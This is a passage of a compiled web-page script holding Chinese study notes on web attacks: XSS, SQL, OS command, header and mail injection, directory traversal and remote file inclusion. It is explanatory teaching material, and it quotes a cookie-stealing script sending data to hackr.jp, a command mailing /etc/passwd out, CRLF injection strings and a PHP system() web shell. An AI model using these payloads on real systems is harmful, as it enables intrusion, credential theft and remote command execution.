(window.webpackJsonp=window.webpackJsonp||[]).push([[77],{572:function(s,a,t){"use strict";t.r(a);var r=t(11),e=Object(r.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"第11章-web的攻击技术"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#第11章-web的攻击技术"}},[s._v("#")]),s._v(" 第11章 Web的攻击技术")]),s._v(" "),a("p"),a("div",{staticClass:"table-of-contents"},[a("ul",[a("li",[a("a",{attrs:{href:"#_1-针对web的攻击技术"}},[s._v("1. 针对Web的攻击技术")]),a("ul",[a("li",[a("a",{attrs:{href:"#_1-1-http不具备必要的安全功能"}},[s._v("1.1 HTTP不具备必要的安全功能")])]),a("li",[a("a",{attrs:{href:"#_1-2-在客户端即可篡改请求"}},[s._v("1.2 在客户端即可篡改请求")])]),a("li",[a("a",{attrs:{href:"#_1-3-针对web应用的攻击模式"}},[s._v("1.3 针对Web应用的攻击模式")])])])]),a("li",[a("a",{attrs:{href:"#_2-因输出值转义不完全引发的安全漏洞"}},[s._v("2. 因输出值转义不完全引发的安全漏洞")]),a("ul",[a("li",[a("a",{attrs:{href:"#_2-1-跨站脚本攻击-xss-cross-site-scripting"}},[s._v("2.1 跨站脚本攻击（XSS，Cross-Site Scripting）")])]),a("li",[a("a",{attrs:{href:"#_2-2-sql注入攻击"}},[s._v("2.2 SQL注入攻击")])]),a("li",[a("a",{attrs:{href:"#_2-3-os命令注入攻击"}},[s._v("2.3 OS命令注入攻击")])]),a("li",[a("a",{attrs:{href:"#_2-4-http首部注入攻击"}},[s._v("2.4 HTTP首部注入攻击")])]),a("li",[a("a",{attrs:{href:"#_2-5-邮件首部注入攻击"}},[s._v("2.5 邮件首部注入攻击")])]),a("li",[a("a",{attrs:{href:"#_2-6-目录遍历攻击"}},[s._v("2.6 目录遍历攻击")])]),a("li",[a("a",{attrs:{href:"#_2-7-远程文件包含漏洞"}},[s._v("2.7 远程文件包含漏洞")])])])]),a("li",[a("a",{attrs:{href:"#_3-因设置或设计上的缺陷引发的安全漏洞"}},[s._v("3. 因设置或设计上的缺陷引发的安全漏洞")]),a("ul",[a("li",[a("a",{attrs:{href:"#_3-1-强制浏览"}},[s._v("3.1 强制浏览")])]),a("li",[a("a",{attrs:{href:"#_3-2-不正确的错误信息处理"}},[s._v("3.2 不正确的错误信息处理")])]),a("li",[a("a",{attrs:{href:"#_3-3-开放重定向"}},[s._v("3.3 开放重定向")])])])]),a("li",[a("a",{attrs:{href:"#_4-因会话管理疏忽引发的安全漏洞"}},[s._v("4. 因会话管理疏忽引发的安全漏洞")]),a("ul",[a("li",[a("a",{attrs:{href:"#_4-1-会话劫持"}},[s._v("4.1 会话劫持")])]),a("li",[a("a",{attrs:{href:"#_4-2-会话固定攻击"}},[s._v("4.2 会话固定攻击")])]),a("li",[a("a",{attrs:{href:"#_4-3-跨站点请求伪造-csrf"}},[s._v("4.3 跨站点请求伪造（CSRF）")])])])]),a("li",[a("a",{attrs:{href:"#_5-其他安全漏洞"}},[s._v("5. 其他安全漏洞")]),a("ul",[a("li",[a("a",{attrs:{href:"#_5-1-密码破解"}},[s._v("5.1 密码破解")])]),a("li",[a("a",{attrs:{href:"#_5-2-点击劫持"}},[s._v("5.2 点击劫持")])]),a("li",[a("a",{attrs:{href:"#_5-3-dos攻击"}},[s._v("5.3 DoS攻击")])]),a("li",[a("a",{attrs:{href:"#_5-4-后门程序"}},[s._v("5.4 后门程序")])])])])])]),a("p"),s._v(" "),a("h2",{attrs:{id:"_1-针对web的攻击技术"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-针对web的攻击技术"}},[s._v("#")]),s._v(" 1. 针对Web的攻击技术")]),s._v(" "),a("p",[s._v("简单的HTTP协议本身并不存在安全性问题，因此协议几乎不会成为攻击的对象。应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标。"),a("br"),s._v(" "),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E7%BD%91%E4%B8%8A%E9%87%8D%E8%A6%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E6%98%8E%E7%BB%86.png",alt:"网上重要攻击事件明细"}})]),s._v(" "),a("h3",{attrs:{id:"_1-1-http不具备必要的安全功能"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-1-http不具备必要的安全功能"}},[s._v("#")]),s._v(" 1.1 HTTP不具备必要的安全功能")]),s._v(" "),a("p",[s._v("几乎现今所有的Web网站都会使用会话管理、加密处理等安全性方面的功能，而HTTP协议内并不具备这些功能。")]),s._v(" "),a("h3",{attrs:{id:"_1-2-在客户端即可篡改请求"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-2-在客户端即可篡改请求"}},[s._v("#")]),s._v(" 1.2 在客户端即可篡改请求")]),s._v(" "),a("p",[s._v("在HTTP请求报文内加载攻击代码，就能发起对Web应用的攻击。通过URL查询字段或表单、HTTP首部、Cookie等途径把攻击代码传入，若这时Web应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限。\n"),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E5%AF%B9Web%E5%BA%94%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB.png",alt:"对Web应用的攻击"}})]),s._v(" "),a("h3",{attrs:{id:"_1-3-针对web应用的攻击模式"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-3-针对web应用的攻击模式"}},[s._v("#")]),s._v(" 1.3 针对Web应用的攻击模式")]),s._v(" "),a("p",[s._v("分为主动攻击和被动攻击。")]),s._v(" "),a("h4",{attrs:{id:"以服务器为目标的主动攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#以服务器为目标的主动攻击"}},[s._v("#")]),s._v(" 以服务器为目标的主动攻击")]),s._v(" "),a("p",[s._v("主动攻击是指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式。"),a("strong",[s._v("主动攻击模式具有代表性的有SQL注入攻击和OS命令注入攻击")]),s._v(" "),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E4%B8%BB%E5%8A%A8%E6%94%BB%E5%87%BB.png",alt:"主动攻击"}})]),s._v(" "),a("h4",{attrs:{id:"以服务器为目标的被动攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#以服务器为目标的被动攻击"}},[s._v("#")]),s._v(" 以服务器为目标的被动攻击")]),s._v(" "),a("p",[s._v("被动攻击是指利用圈套策略执行攻击代码的攻击模式。")]),s._v(" "),a("p",[s._v("步骤1：攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的HTTP请求。"),a("br"),s._v("\n步骤2：当用户中招后，用户的浏览器或邮件客户端会触发这个陷阱。"),a("br"),s._v("\n步骤3：中招后的用户浏览器会把含有攻击代码的HTTP请求发送给作为攻击目标的Web应用，运行攻击代码。"),a("br"),s._v("\n步骤4：执行完攻击代码，存在安全漏洞的Web应用会成为攻击者的跳板，可能导致用户所持的Cookie等个人信息被窃取，登录状态中的用户权限遭到恶意滥用。")]),s._v(" "),a("p",[a("strong",[s._v("被动攻击具有代表的攻击是跨站脚本攻击和跨站点请求伪造")]),s._v("。\n"),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E8%A2%AB%E5%8A%A8%E6%94%BB%E5%87%BB.png",alt:"被动攻击"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E5%88%A9%E7%94%A8%E8%A2%AB%E5%8A%A8%E6%94%BB%E5%87%BB%E5%AF%B9%E4%BC%81%E4%B8%9A%E5%86%85%E7%BD%91%E5%8F%91%E5%8A%A8%E6%94%BB%E5%87%BB.png",alt:"利用被动攻击对企业内网发动攻击"}})]),s._v(" "),a("h2",{attrs:{id:"_2-因输出值转义不完全引发的安全漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-因输出值转义不完全引发的安全漏洞"}},[s._v("#")]),s._v(" 2. 因输出值转义不完全引发的安全漏洞")]),s._v(" "),a("p",[s._v("实施Web应用的安全对策可大致分为以下两部分：")]),s._v(" "),a("ul",[a("li",[s._v("客户端的验证")]),s._v(" "),a("li",[s._v("Web应用端（服务器端）的验证"),a("br"),s._v("\n输入值验证"),a("br"),s._v("\n输出值转义")])]),s._v(" "),a("p",[s._v("由于客户端允许篡改数据或关闭js，不适合将JavaScript验证作为安全的防范对策。保留客户端验证只是为了尽早辨识输入错误，起到提高UI体验的作用。")]),s._v(" "),a("p",[s._v("从数据库或文件系统、HTML、邮件等输出Web应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。")]),s._v(" "),a("h3",{attrs:{id:"_2-1-跨站脚本攻击-xss-cross-site-scripting"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-1-跨站脚本攻击-xss-cross-site-scripting"}},[s._v("#")]),s._v(" 2.1 跨站脚本攻击（XSS，Cross-Site Scripting）")]),s._v(" "),a("p",[a("strong",[s._v("跨站脚本攻击是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或Js进行的一种攻击")]),s._v("。动态创建的HTML部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。")]),s._v(" "),a("p",[s._v("有以下影响：")]),s._v(" "),a("ul",[a("li",[s._v("利用虚假输入表单骗取用户个人信息")]),s._v(" "),a("li",[s._v("利用脚本窃取用户的Cookie值，被害者在不知情情况下，帮助攻击者发送恶意请求。")]),s._v(" "),a("li",[s._v("显示伪造的文章或图片")])]),s._v(" "),a("h4",{attrs:{id:"跨站脚本案例"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#跨站脚本案例"}},[s._v("#")]),s._v(" 跨站脚本案例")]),s._v(" "),a("ul",[a("li",[a("p",[s._v("在动态生成的HTML处发生"),a("br"),s._v(" "),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB.png",alt:"跨站脚本攻击"}}),a("br"),s._v("\n此时，浏览器会将用户输入的<s>解析成HTML标签，然后显示删除线。如果换成js就有可能暴露信息。")])]),s._v(" "),a("li",[a("p",[s._v("XSS是攻击者利用预先设置的陷阱触发的被动攻击"),a("br"),s._v("\n创建以下代码的URL，攻击者隐藏植入事先准备好的欺诈邮件中或Web页面中，诱使用户去点击该URL。"),a("br"),s._v(" "),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB2.png",alt:"跨站脚本攻击2"}}),a("br"),s._v("\n浏览器打开URI后，直观感觉没发生任何变化，但设置好的脚本确偷偷开始运行了。当用户在表单内输入ID和密码之后，就会直接发送到攻击者网站，导致个人信息被窃取。"),a("br"),s._v(" "),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB3.png",alt:"跨站脚本攻击3"}})])])]),s._v(" "),a("h4",{attrs:{id:"对用户cookie的窃取攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#对用户cookie的窃取攻击"}},[s._v("#")]),s._v(" 对用户Cookie的窃取攻击")]),s._v(" "),a("p",[s._v("除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的Cookie信息。")]),s._v(" "),a("div",{staticClass:"language-js line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("http"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("hackr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("jp"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("xss"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("js"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//xss.js")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" content"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("escape")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\ndocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"<img src=http://hackr.jp/?"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\ndocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("content"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\ndocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('">"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("有安全漏洞的Web应用上执行上面这段Js代码，即可访问到该Web应用所在域名下的Cookie信息。然后这些信息会发送至攻击者的Web网站（hackr.jp），记录在它的登录日志中。"),a("br"),s._v(" "),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB4.png",alt:"跨站脚本攻击4"}})]),s._v(" "),a("h3",{attrs:{id:"_2-2-sql注入攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-2-sql注入攻击"}},[s._v("#")]),s._v(" 2.2 SQL注入攻击")]),s._v(" "),a("p",[s._v("SQL注入是指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击。会导致信息的泄露。")]),s._v(" "),a("p",[s._v("如果在调用SQL语句的方式上存在疏漏，就有可能执行被恶意注入非法SQL语句。"),a("br"),s._v("\n造成的影响：")]),s._v(" "),a("ul",[a("li",[s._v("非法查看或篡改数据库内的数据")]),s._v(" "),a("li",[s._v("规避认证")]),s._v(" "),a("li",[s._v("执行和数据库服务器业务关联的程序等")])]),s._v(" "),a("p",[s._v("SQL是用来操作关系型数据库管理系统的数据库语言，可进行操作数据或定义数据等。")]),s._v(" "),a("h4",{attrs:{id:"sql注入攻击案例"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sql注入攻击案例"}},[s._v("#")]),s._v(" SQL注入攻击案例")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB.png",alt:"SQL注入攻击"}}),a("br"),s._v("\nSQL语句中的--之后全视为注释。")]),s._v(" "),a("p",[s._v("SQL注入攻击是攻击者将SQL语句改变成开发者意想不到的形式以达到破坏结构的攻击。")]),s._v(" "),a("h3",{attrs:{id:"_2-3-os命令注入攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-3-os命令注入攻击"}},[s._v("#")]),s._v(" 2.3 OS命令注入攻击")]),s._v(" "),a("p",[s._v("OS命令注入攻击是指通过Web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险。")]),s._v(" "),a("p",[s._v("OS命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。")]),s._v(" "),a("h4",{attrs:{id:"os注入攻击案例"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#os注入攻击案例"}},[s._v("#")]),s._v(" OS注入攻击案例")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11OS%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB.png",alt:"OS注入攻击"}}),a("br"),s._v("\n攻击者将下面的值作为邮件地址：")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /etc/passwd "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" mail hack@example.jp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("程序接收该值，构成以下的命令组合。")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" /usr/sbin/sendmail "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /etc/passwd "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" mail hack@example.jp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("攻击者的输入值中含有分号（;）。这个符号在OS命令中，会被解析为分隔多个执行命令的标记。")]),s._v(" "),a("h3",{attrs:{id:"_2-4-http首部注入攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-4-http首部注入攻击"}},[s._v("#")]),s._v(" 2.4 HTTP首部注入攻击")]),s._v(" "),a("p",[s._v("HTTP首部注入攻击是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击，属于被动攻击。")]),s._v(" "),a("p",[s._v("向首部主体内添加内容的攻击称为HTTP响应截断攻击。")]),s._v(" "),a("p",[s._v("造成的影响：")]),s._v(" "),a("ul",[a("li",[s._v("设置任何Cookie信息")]),s._v(" "),a("li",[s._v("重定向至任意URL")]),s._v(" "),a("li",[s._v("显示任意的主体（HTTP响应截断攻击）")])]),s._v(" "),a("h4",{attrs:{id:"http首部注入攻击案例"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#http首部注入攻击案例"}},[s._v("#")]),s._v(" HTTP首部注入攻击案例")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11HTTP%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5.png",alt:"HTTP首部注入"}}),a("br"),s._v("\n攻击者以下面的内容替换之前的类别ID后发送请求：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("101%0D&0ASet-Cookie:+SID=123456789\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("%0D&0A代表HTTP报文中的换行符，然后是可强制将攻击者网站的会话ID设置成SID=123456789的Set-Cookie首部字段。因此攻击者可指定修改任意的Cookie信息。通过和会话固定攻击攻击组合，攻击者可伪装成用户。")]),s._v(" "),a("p",[s._v("攻击者输入的%0D&0A，本来应该属于首部字段Location的查询部分，但经过解析后，变成了换行符，结果插入了新的首部字段。这样，攻击者可以在响应中插入任意的首部字段。")]),s._v(" "),a("h4",{attrs:{id:"http响应截断攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#http响应截断攻击"}},[s._v("#")]),s._v(" HTTP响应截断攻击")]),s._v(" "),a("p",[s._v("HTTP响应截断攻击是用在HTTP首部注入的一种攻击。攻击顺序相同，但要将两个%0D%0A%0D%0A并排插入字符串后发送。利用这两个连续的换行就可作出HTTP首部与主体分隔所需的空行了。这样就能显示伪造的主体，达到攻击目的。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("%0D%0A%0D%0A<HTML><HEAD><TITLE>kdkdskdkfdkk\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("注入后返回结果得到以下这种响应：\n"),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11HTTP%E9%A6%96%E9%83%A8%E4%B8%BB%E4%BD%93%E6%B3%A8%E5%85%A5.png",alt:"HTTP首部主体注入"}}),a("br"),s._v("\n利用这个攻击，已触发陷阱的用户浏览器会显示伪造的Web页面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果。")]),s._v(" "),a("p",[s._v("另外，滥用HTTP/1.1中汇集多响应返回功能，会导致缓存服务器对任意内容进行缓存操作。这种攻击称为"),a("strong",[s._v("缓存污染")]),s._v("。使用该缓存服务器的用户，在浏览遭受攻击的网站时，会不断的浏览被替换掉的Web网页。")]),s._v(" "),a("h3",{attrs:{id:"_2-5-邮件首部注入攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-5-邮件首部注入攻击"}},[s._v("#")]),s._v(" 2.5 邮件首部注入攻击")]),s._v(" "),a("p",[s._v("邮件首部注入是指Web应用中的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E9%82%AE%E4%BB%B6%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB.png",alt:"邮件首部注入攻击"}})]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("bob@hacker.jp%0D%0ABcc:user@example.com\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("一旦咨询表单所在的Web应用接收了这个换行符，就可能实现对Bcc邮件地址的追加发送。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("bob@hacker.jp%0D%0A%0D%0ATest Message\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("两个连续的换行符就有可能篡改邮件文本内容并发送")]),s._v(" "),a("h3",{attrs:{id:"_2-6-目录遍历攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-6-目录遍历攻击"}},[s._v("#")]),s._v(" 2.6 目录遍历攻击")]),s._v(" "),a("p",[s._v("目录遍历攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也被称为路径遍历攻击。")]),s._v(" "),a("p",[s._v("用户可使用../等相对路径定位到/etc/passed等绝对路径上，因此服务器上任意的文件或文件目录都可被访问到。就有可能非法浏览、篡改、或删除Web服务器上的文件。应该关闭指定对任意文件名的访问权限。")]),s._v(" "),a("h4",{attrs:{id:"目录遍历攻击案例"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#目录遍历攻击案例"}},[s._v("#")]),s._v(" 目录遍历攻击案例")]),s._v(" "),a("p",[s._v("读取指定的文件：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("http://example.com/red.php?log=0401.log\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("攻击者设置如下查询字段后发出请求：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("http://example.com/red.php?../../etc/passwd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB.png",alt:"目录遍历攻击"}})]),s._v(" "),a("h3",{attrs:{id:"_2-7-远程文件包含漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-7-远程文件包含漏洞"}},[s._v("#")]),s._v(" 2.7 远程文件包含漏洞")]),s._v(" "),a("p",[s._v("远程文件的包含漏洞是指当部分脚本内容需要从其他文件读取时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取后，就可运行任意脚本的一种攻击。")]),s._v(" "),a("p",[s._v("这主要是PHP存在的安全漏洞。")]),s._v(" "),a("h4",{attrs:{id:"远程文件包含漏洞的攻击案例"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#远程文件包含漏洞的攻击案例"}},[s._v("#")]),s._v(" 远程文件包含漏洞的攻击案例")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("http://example.com/foo.php?mod=news.php\n\n//foo.php对应脚本代码如下\n$modname=$_GET['mod'];\ninclude($modname);\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("攻击者指定如下请求：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("http://example.com/foo.php?mod=http://hacker.jp/cmd.php&cmd=ls\n\n//cmd.php对应脚本代码如下\n<? system($_GET['cmd']) ?>\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("假设Web服务器（example.com）的include能引入外部服务器的URL，那就会读入攻击者在外部服务器上事先准备的URL（http://hackr.jp/cmd.php）。结果，通过system函数就能在Web服务器上执行查询字段指定的OS命令了。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB.png",alt:"远程文件攻击"}})]),s._v(" "),a("h2",{attrs:{id:"_3-因设置或设计上的缺陷引发的安全漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-因设置或设计上的缺陷引发的安全漏洞"}},[s._v("#")]),s._v(" 3. 因设置或设计上的缺陷引发的安全漏洞")]),s._v(" "),a("p",[s._v("因设置或设计上的缺陷引发的安全漏洞是指，错误设置Web服务器，或是由设计上的一些问题引起的安全漏洞。")]),s._v(" "),a("h3",{attrs:{id:"_3-1-强制浏览"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-1-强制浏览"}},[s._v("#")]),s._v(" 3.1 强制浏览")]),s._v(" "),a("p",[s._v("从安置在Web服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。")]),s._v(" "),a("p",[s._v("造成的影响：")]),s._v(" "),a("ul",[a("li",[s._v("泄露顾客的个人信息等重要情报")]),s._v(" "),a("li",[s._v("泄露原本需要具有访问权限的用户才可查阅的信息内容")]),s._v(" "),a("li",[s._v("泄露未外连到外界的文件")])]),s._v(" 